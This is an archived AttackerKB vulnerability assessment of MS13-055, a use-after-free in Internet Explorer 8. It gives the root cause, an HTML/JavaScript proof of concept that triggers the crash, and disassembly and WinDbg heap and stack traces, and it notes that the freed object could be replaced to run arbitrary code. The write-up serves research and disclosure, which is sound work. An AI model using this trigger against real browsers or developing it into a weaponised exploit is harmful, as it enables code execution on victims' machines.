---
title: MS13-055 Microsoft Internet Explorer CAnchorElement Use-After-Free
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
created: '2019-09-12T18:07:20.321858'
revision_date: '2020-02-13T17:12:17.52303'
assessment_id: 034c6b21-23f8-4a4f-b73f-cad8bb1332eb
topic_id: b9f151bf-d837-464d-8812-b80f00740b6d
topic_short_id: 4EqhQ72lha
topic_slug: ms13-055-microsoft-internet-explorer-canchorelement-use-after-free
akb_topic_url: https://attackerkb.com/topics/4EqhQ72lha/ms13-055-microsoft-internet-explorer-canchorelement-use-after-free
akb_assessment_url: https://attackerkb.com/topics/4EqhQ72lha/ms13-055-microsoft-internet-explorer-canchorelement-use-after-free#034c6b21-23f8-4a4f-b73f-cad8bb1332eb
---

# MS13-055 Microsoft Internet Explorer CAnchorElement Use-After-Free

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/4EqhQ72lha/ms13-055-microsoft-internet-explorer-canchorelement-use-after-free#034c6b21-23f8-4a4f-b73f-cad8bb1332eb).*

---

# Analysis

In IE8 standards mode, it's possible to cause a use-after-free condition by first creating an
illogical table tree, where a CPhraseElement comes after CTableRow, with the final node being
a sub table element. When the CPhraseElement's outer content is reset by using either outerText
or outerHTML through an event handler, this triggers a free of its child element (in this case,
a CAnchorElement, but some other objects apply too), but a reference is still kept in function
SRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next
functions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's
SecurityContext virtual function at offset +0x70, which results a crash. An attacker can take
advantage of this by first creating an CAnchorElement object, let it free, and then replace the
freed memory with another fake object. Successfully doing so may allow arbitrary code execution
under the context of the user.

This bug is specific to Internet Explorer 8 only. It was originally discovered by Orange Tsai at
Hitcon 2013, but was silently patched in the July 2013 update (MS13-055).

PoC does not trigger for the following setups:

* Win XP SP3 + IE7
* Win 7 SP1 + IE9

# PoC

```
<!DOCTYPE html>

<table>
    <tr>
        <div>
            <span>
                <q id='e'>
                    <a>
                        <td></td>
                    </a>
                </q>
            </span>
        </div>
    </tr>
</table>

<script>
window.onload = function(){
var x = document.getElementById('e');
x.outerHTML = '';
}
</script>
</html>
```

# DOM Tree

```
CBodyElement -> CTable -> CTableSection -> CTableRow -> CPhraseElement -> CAnchorElement -> CTableCell
```


# Win XP SP3 + IE8

```
.text:63717B12 ; public: class ISpanQualifier * __thiscall SRunPointer::SpanQualifier(void)const
.text:63717B12 ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ proc near
...
text:63717B2D                 mov     eax, [eax+0Ch]

And then this return value is passed on to GetFancyFormat:

.text:6371DBC5                 call    ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ ; SRunPointer::SpanQualifier(void)
.text:6371DBCA                 call    ?GetFancyFormat@ISpanQualifier@@QAEPBVCFancyFormat@@_N@Z ; ISpanQualifier::GetFancyFormat(bool)
...

In GetFancyFormat, that return value is assigned to ESI:
.text:63717F1A                 mov     esi, eax
.text:63717F1C                 call    ?IsTreeNodeQualifier@ISpanQualifier@@QBE_NXZ ; ISpanQualifier::IsTreeNodeQualifier(void)

ESI will then get assigned to ECX - "this" in C++:
.text:63717F29                 mov     ecx, esi
.text:63717F2B                 call    ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; CTreeNode::GetFancyFormat(void)
```

You keep following ECX, eventually that leads to the crash.

```
0:008> dd ebx L30/4
06a20fb0  06a32f98 00000000 ffff0002 ffffffff
06a20fc0  00000011 00000000 00000000 00000000
06a20fd0  00000000 06a20fd8 00000012 00000000


vftable     = 06a32f98
Ref counter = 0


0:008> !heap -p -a ebx
    address 06a20fb0 found in
    _DPH_HEAP_ROOT @ 151000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 653d418:          6a20fb0               4c -          6a20000             2000
          ? <Unloaded_pi.dll>+6a32f97
    7c918f01 ntdll!RtlAllocateHeap+0x00000e64
    636a9a94 mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141
    636a99d3 mshtml!CHtmRootParseCtx::EndElement+0x000000cb
    635a8ee4 mshtml!CHtmTextParseCtx::EndElement+0x0000006e
    635a71eb mshtml!CHtmParse::EndElement+0x0000007b
    6359f47c mshtml!CHtmParse::CloseContainer+0x000001c5
    635bf441 mshtml!CHtmParse::CloseAllContainers+0x00000026
    635a941d mshtml!CHtmParse::PrepareContainer+0x0000007f
    635a933f mshtml!CHtmParse::ParseBeginTag+0x00000028
    635a6bb6 mshtml!CHtmParse::ParseToken+0x00000082
    635a7ff4 mshtml!CHtmPost::ProcessTokens+0x00000237
    635a734c mshtml!CHtmPost::Exec+0x00000221
    635ac2b8 mshtml!CHtmPost::Run+0x00000015
    635ac21b mshtml!PostManExecute+0x000001fd
    635ac17e mshtml!PostManResume+0x000000f8
    635ac0e2 mshtml!CHtmPost::OnDwnChanCallback+0x00000010



0:008> !heap -p -a ecx
    address 06a32f98 found in
    _DPH_HEAP_ROOT @ 151000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    653d6c0:          6a32000             2000
    7c927553 ntdll!RtlFreeHeap+0x000000f9
    637e06f2 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028
    63628a50 mshtml!CBase::SubRelease+0x00000022
    63625df6 mshtml!CElement::PrivateExitTree+0x00000011
    635c5ef1 mshtml!CMarkup::SpliceTreeInternal+0x00000083
    635c84e3 mshtml!CDoc::CutCopyMove+0x000000ca
    635c9264 mshtml!CDoc::Remove+0x00000018
    635c92e9 mshtml!RemoveWithBreakOnEmpty+0x0000003a
    63742f86 mshtml!CElement::InjectInternal+0x0000032a
    635c9415 mshtml!CElement::InjectCompatBSTR+0x00000046
    638bb56b mshtml!CElement::put_outerText+0x00000025
    6366906f mshtml!GS_BSTR+0x000001ab
    636430c9 mshtml!CBase::ContextInvokeEx+0x000005d1
    6366418a mshtml!CElement::ContextInvokeEx+0x0000009d
    6362b6ce mshtml!CInput::VersionedInvokeEx+0x0000002d
    63642eec mshtml!PlainInvokeEx+0x000000ea

.text:635C4A2E ; public: static long __stdcall CAnchorElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *)
.text:635C4A2E ?CreateElement@CAnchorElement@@SGJPAVCHtmTag@@PAVCDoc@@PAPAVCElement@@@Z proc near
.text:635C4A2E                                         ; DATA XREF: .text:6364B798o
.text:635C4A2E
.text:635C4A2E arg_4           = dword ptr  0Ch
.text:635C4A2E arg_8           = dword ptr  10h
.text:635C4A2E
.text:635C4A2E ; FUNCTION CHUNK AT .text:638589CC SIZE 0000000A BYTES
.text:635C4A2E
.text:635C4A2E                 mov     edi, edi
.text:635C4A30                 push    ebp
.text:635C4A31                 mov     ebp, esp
.text:635C4A33                 push    esi
.text:635C4A34                 push    edi
.text:635C4A35                 push    68h             ; dwBytes
.text:635C4A37                 push    8               ; dwFlags
.text:635C4A39                 push    _g_hProcessHeap ; hHeap
.text:635C4A3F                 xor     edi, edi
.text:635C4A41                 call    ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)



0:008> r
eax=63aae200 ebx=06a20fb0 ecx=06a32f98 edx=00000000 esi=037cd1e0 edi=00000000
eip=6363fcc4 esp=037cd1b4 ebp=037cd1cc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc:
6363fcc4 8b01            mov     eax,dword ptr [ecx]  ds:0023:06a32f98=????????

0:008> dds 63630788+0x70 L1
636307f8  6363fc94 mshtml!CElement::SecurityContext



0:008> k
ChildEBP RetAddr
037cd1b0 63602718 mshtml!CElement::Doc
037cd1cc 636026a3 mshtml!CTreeNode::ComputeFormats+0xb9
037cd478 63612a85 mshtml!CTreeNode::ComputeFormatsHelper+0x44
037cd488 63612a45 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
037cd498 63612a2c mshtml!CTreeNode::GetFancyFormatHelper+0xf
037cd4a8 63717f30 mshtml!CTreeNode::GetFancyFormat+0x35
037cd4b4 6371dbcf mshtml!ISpanQualifier::GetFancyFormat+0x5a
037cd4c0 6371db8f mshtml!SRunPointer::IsRelativeSpanEdge+0x3a
037cd4c8 637224a7 mshtml!SRunPointer::IsRelativeSpan+0x14
037cd4e8 63722412 mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d
037cd518 63723ccf mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24d
037cd89c 63723c13 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90
037cd924 63723b48 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66
037cda10 6370e989 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203
037cdac8 6370e73e mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7
037cde48 636ccc93 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x349
037cdeec 636cca21 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x130
037ce408 6370c515 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad
037ce888 6370c515 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6
037ced08 6370e989 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6

```


# Win 7 SP0 + IE8

```
Microsoft (R) Windows Debugger Version 6.11.0001.404 X86
Copyright (c) Microsoft Corporation. All rights reserved.
....
0:012> g
....
(c20.274): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=6b105100 ebx=08a7ffb0 ecx=08f0ff98 edx=00000000 esi=043fcf78 edi=00000000
eip=6ad8c400 esp=043fcf4c ebp=043fcf64 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc:
6ad8c400 8b01            mov     eax,dword ptr [ecx]  ds:0023:08f0ff98=????????
0:005> u
mshtml!CElement::Doc:
6ad8c400 8b01            mov     eax,dword ptr [ecx]
6ad8c402 8b5070          mov     edx,dword ptr [eax+70h]
6ad8c405 ffd2            call    edx
6ad8c407 8b400c          mov     eax,dword ptr [eax+0Ch]
6ad8c40a c3              ret
6ad8c40b 33c0            xor     eax,eax
6ad8c40d e9f7aeffff      jmp     mshtml!CAttrArray::PrivateFind+0x8f (6ad87309)
6ad8c412 90              nop
0:005> k
ChildEBP RetAddr
043fcf48 6adb5961 mshtml!CElement::Doc
043fcf64 6adb586d mshtml!CTreeNode::ComputeFormats+0xba
043fd210 6adba12d mshtml!CTreeNode::ComputeFormatsHelper+0x44
043fd220 6adba0ed mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
043fd230 6adba0d4 mshtml!CTreeNode::GetFancyFormatHelper+0xf
043fd240 6ac3b9c4 mshtml!CTreeNode::GetFancyFormat+0x35
043fd24c 6acb15b0 mshtml!ISpanQualifier::GetFancyFormat+0x5a
043fd258 6acb156d mshtml!SRunPointer::IsRelativeSpanEdge+0x3a
043fd260 6acb4c92 mshtml!SRunPointer::IsRelativeSpan+0x14
043fd290 6acb4bfd mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d
043fd2c0 6acb532e mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24c
043fd644 6acb5272 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90
043fd6d4 6acb51a7 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66
043fd7c0 6ac9e4a9 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203
043fd878 6ac9e271 mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7
043fdbf8 6ac57a79 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x352
043fdc9c 6ac57834 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x133
043fe1b8 6ac9d919 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad
043fe638 6ac9d919 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9
043feab8 6ac9e4a9 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9
0:005> !heap -p -a ebx
    address 08a7ffb0 found in
    _DPH_HEAP_ROOT @ 51000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 83d3e04:          8a7ffb0               4c -          8a7f000             2000
    6d4f8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
    77594ea6 ntdll!RtlDebugAllocateHeap+0x00000030
    77557d96 ntdll!RtlpAllocateHeap+0x000000c4
    775234ca ntdll!RtlAllocateHeap+0x0000023a
    6ac2565b mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141
    6ac2557e mshtml!CHtmRootParseCtx::EndElement+0x000000cb
    6ad17870 mshtml!CHtmTextParseCtx::EndElement+0x0000006e
    6ad170b8 mshtml!CHtmParse::EndElement+0x0000007b
    6ad2a4de mshtml!CHtmParse::CloseContainer+0x000001c1
    6ad292d3 mshtml!CHtmParse::CloseAllContainers+0x00000026
    6ad18864 mshtml!CHtmParse::PrepareContainer+0x0000007f
    6ad18907 mshtml!CHtmParse::ParseBeginTag+0x00000028
    6ad16e93 mshtml!CHtmParse::ParseToken+0x00000082
    6ad175c9 mshtml!CHtmPost::ProcessTokens+0x00000237
    6ad078e8 mshtml!CHtmPost::Exec+0x00000221
    6ad08a99 mshtml!CHtmPost::Run+0x00000015
    6ad089fd mshtml!PostManExecute+0x000001fb
    6ad07c66 mshtml!PostManResume+0x000000f7
    6ad213f6 mshtml!CHtmPost::OnDwnChanCallback+0x00000010
    6ad053fc mshtml!CDwnChan::OnMethodCall+0x00000019
    6ada94b2 mshtml!GlobalWndOnMethodCall+0x000000ff
    6ad937f7 mshtml!GlobalWndProc+0x0000010c
    75bc86ef USER32!InternalCallWinProc+0x00000023
    75bc8876 USER32!UserCallWinProcCheckWow+0x0000014b
    75bc89b5 USER32!DispatchMessageWorker+0x0000035e
    75bc8e9c USER32!DispatchMessageW+0x0000000f
    6d8004a6 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000452
    6d810446 IEFRAME!LCIETab_ThreadProc+0x000002c1
    763849bd iertutil!CIsoScope::RegisterThread+0x000000ab
    75f71174 kernel32!BaseThreadInitThunk+0x0000000e
    7752b3f5 ntdll!__RtlUserThreadStart+0x00000070
    7752b3c8 ntdll!_RtlUserThreadStart+0x0000001b


0:005> !heap -p -a ecx
    address 08f0ff98 found in
    _DPH_HEAP_ROOT @ 51000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    8f50138:          8f0f000             2000
    6d4f90b2 verifier!AVrfDebugPageHeapFree+0x000000c2
    77595674 ntdll!RtlDebugFreeHeap+0x0000002f
    77557aca ntdll!RtlpFreeHeap+0x0000005d
    77522d68 ntdll!RtlFreeHeap+0x00000142
    75f6f1ac kernel32!HeapFree+0x00000014
    6adf8c42 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028
    6ad97dd0 mshtml!CBase::SubRelease+0x00000022
    6adf0fdf mshtml!CElement::PrivateExitTree+0x00000011
    6acd5b42 mshtml!CMarkup::SpliceTreeInternal+0x00000083
    6acd6ff9 mshtml!CDoc::CutCopyMove+0x000000ca
    6acd6f39 mshtml!CDoc::Remove+0x00000018
    6acd6f17 mshtml!RemoveWithBreakOnEmpty+0x0000003a
    6ac0288a mshtml!CElement::InjectInternal+0x0000032a
    6acd704a mshtml!CElement::InjectCompatBSTR+0x00000046
    6af1aee9 mshtml!CElement::put_outerText+0x00000025
    6ae172d6 mshtml!GS_BSTR+0x000001ac
    6ae0235c mshtml!CBase::ContextInvokeEx+0x000005dc
    6ae0c75a mshtml!CElement::ContextInvokeEx+0x0000009d
    6ae0c79a mshtml!CInput::VersionedInvokeEx+0x0000002d
    6adb3104 mshtml!PlainInvokeEx+0x000000eb
    6cdea22a jscript!IDispatchExInvokeEx2+0x00000104
    6cdea175 jscript!IDispatchExInvokeEx+0x0000006a
    6cdea3f6 jscript!InvokeDispatchEx+0x00000098
    6cdea4a0 jscript!VAR::InvokeByName+0x00000139
    6cdfd8c8 jscript!VAR::InvokeDispName+0x0000007d
    6cde9c0e jscript!CScriptRuntime::Run+0x0000208d
    6cdf5c9d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce
    6cdf5bfb jscript!ScrFncObj::Call+0x0000008d
    6cdf5e11 jscript!CSession::Execute+0x0000015f
    6cdef3ee jscript!NameTbl::InvokeDef+0x000001b5
    6cdeea2e jscript!NameTbl::InvokeEx+0x0000012c
    6ae27af1 mshtml!CBase::InvokeDispatchWithThis+0x000001e1
```
